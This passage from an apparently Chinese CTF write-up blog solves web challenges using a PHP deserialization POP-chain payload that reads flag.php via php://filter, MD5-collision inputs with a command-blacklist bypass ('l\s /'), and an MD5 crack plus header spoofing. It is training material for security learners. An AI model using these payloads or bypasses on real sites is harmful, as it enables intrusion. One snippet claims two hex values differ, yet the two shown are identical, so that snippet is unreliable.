class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Welcome to '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token comment">//here</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//类被当成字符串时的回应方法</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">str</span><span class="token operator">-&gt;</span><span class="token property">source</span><span class="token punctuation">;</span><span class="token comment">//str无source</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//反序列化一个Show实例时，会触发__wakeup方法</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">//在preg_match的时候，会将对象转换为字符串，触发该对象的__toString方法。</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//在对象的外部获取私有成员属性的值时调用</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>Show<span class="token operator">.</span><span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>Show<span class="token operator">.</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>Test<span class="token operator">.</span><span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>Modifier<span class="token operator">.</span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>Modifier<span class="token operator">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php<span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//Show.__wakeup()=&gt;Show.__toString()=&gt;Test.__get()=&gt;Modifier.__invoke()</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-&gt;</span><span class="token property">p</span><span class="token operator">=</span><span class="token variable">$d</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-&gt;</span><span class="token property">str</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">source</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";N;s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:" * var";s:8:"flag.php";}}}s:3:"str";N;}</span><span class="token comment">//O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在urlencode函数中，星号*不被编码</p></blockquote><p>所以就不用删除/加%00了~</p><p>但输入后看不见（</p><p>于是用伪协议</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/convert.base64-encode/resource=flag.php'</span><span class="token punctuation">;</span> <span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Show"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"source"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Show"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"source"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"str"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Modifier"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">" * var"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">52</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"php://filter/convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"str"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">?</span>pop<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Show<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>source<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Show<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>source<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>str<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Test<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>p<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Modifier<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>var<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A52<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>php<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>Ffilter<span class="token operator">%</span><span class="token number">2</span>Fconvert<span class="token operator">.</span>base64<span class="token operator">-</span>encode<span class="token operator">%</span><span class="token number">2</span>Fresource<span class="token operator">%</span><span class="token number">3</span>Dflag<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>str<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7daeda834e136fa2042cb8cc7c5fc444.png"></p><hr><h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5a796ce1b04782f2d17aeb67a0e34a98.png"></p><p>有个cmd</p><p><code>;"()</code>等被forbid了（</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/d02ca9ba5d6a9730b575650cd51a3fc4.png"></p><pre class="line-numbers language-none"><code class="language-none">flag.phpTmpZMll6WXhOamN5WlRjd05qZzNNQT09<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>17张牌你能秒我？（</p><pre class="line-numbers language-none"><code class="language-none">index.phpTmprMlpUWTBOalUzT0RKbE56QTJPRGN3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token class-name">E_ALL</span> <span class="token operator">||</span> <span class="token operator">~</span> <span class="token constant">E_NOTICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^a-zA-Z0-9.]+/"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//过滤了所有非字母数字和点号</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src ="./ctf3.jpeg"&gt;'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xixi～ no flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='data:image/gif;base64,"</span> <span class="token operator">.</span> <span class="token variable">$txt</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'&gt;&lt;/img&gt;"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"forbid ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`$cmd`</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"md5 is funny ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">?</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span><span class="token operator">&lt;</span>style<span class="token operator">&gt;</span>  body<span class="token punctuation">{</span>   background<span class="token punctuation">:</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token operator">.</span><span class="token operator">/</span>bj<span class="token operator">.</span>png<span class="token punctuation">)</span>  no<span class="token operator">-</span>repeat center center<span class="token punctuation">;</span>   background<span class="token operator">-</span>size<span class="token punctuation">:</span>cover<span class="token punctuation">;</span>   background<span class="token operator">-</span>attachment<span class="token punctuation">:</span>fixed<span class="token punctuation">;</span>   background<span class="token operator">-</span>color<span class="token punctuation">:</span><span class="token comment">#CCCCCC;</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>style<span class="token operator">&gt;</span><span class="token operator">&lt;</span>body<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">(string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>问一下小鲸鱼（</p><pre class="line-numbers language-none"><code class="language-none">$a = hex2bin('4dc968ff0ee20c95a107d9d9b7266d1edf769e0b166a237eaa6e7a75df06a0b916fca50eaa417218e8fec75d2d69bb1ee5a758a2ce5b0d5a61f9c735c5ac355');$b = hex2bin('4dc968ff0ee20c95a107d9d9b7266d1edf769e0b166a237eaa6e7a75df06a0b916fca50eaa417218e8fec75d2d69bb1ee5a758a2ce5b0d5a61f9c735c5ac355');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这两个二进制数据不同，但它们的 MD5 哈希值相同：</p><pre class="line-numbers language-none"><code class="language-none">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>l\s /</code></p><p>或者用dir也行<a href="https://blog.csdn.net/weixin_41905135/article/details/124881754">Windows系统命令dir使用详解_dir命令-CSDN博客</a></p><p><code>dir /</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c70091c4c72ff7682b768c9e80aa5b7a.png"></p><hr><h3 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">  <span class="token keyword">function</span> <span class="token function-definition function">enc</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">{</span>      hash <span class="token operator">=</span> <span class="token function">hex_md5</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> hash<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">var</span> code <span class="token operator">=</span> document<span class="token operator">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"vcode"</span><span class="token punctuation">)</span><span class="token operator">.</span>value<span class="token punctuation">;</span><span class="token comment">//document 是 JavaScript 中表示整个 HTML 文档的对象，通过它可以访问和操作 HTML 文档中的各种元素。</span><span class="token comment">//getElementById() 是 document 对象的一个方法，用于根据元素的 id 属性来查找并返回对应的元素。</span><span class="token comment">//value 是 HTML 表单元素（如 &lt;input&gt;、&lt;textarea&gt;、&lt;select&gt; 等）的一个属性，用于获取或设置这些元素的值。所以，当对 document.getElementById("vcode") 返回的元素使用 .value 时，就可以得到该元素当前所包含的值。</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>code <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">hex_md5</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"0cd4da0223c0b280829dc3ea458d655c"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"您通过了验证！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          window<span class="token operator">.</span>location <span class="token operator">=</span> <span class="token string double-quoted-string">"./flag.php"</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>          <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你的授权码不正确！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"请输入授权码"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>          <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现输入框对应的id为vcode</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0b2ca3411cc6c5f6872c342bad8e30c7.png"></p><p>找个网站解一下<a href="https://www.somd5.com/">MD5免费在线解密破解_MD5在线加密-SOMD5</a></p><pre class="line-numbers language-none"><code class="language-none">0cd4da0223c0b280829dc3ea458d655cARandomString<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>把购买者的IP保存了</p></blockquote><p><code>X-Forwarded-For: 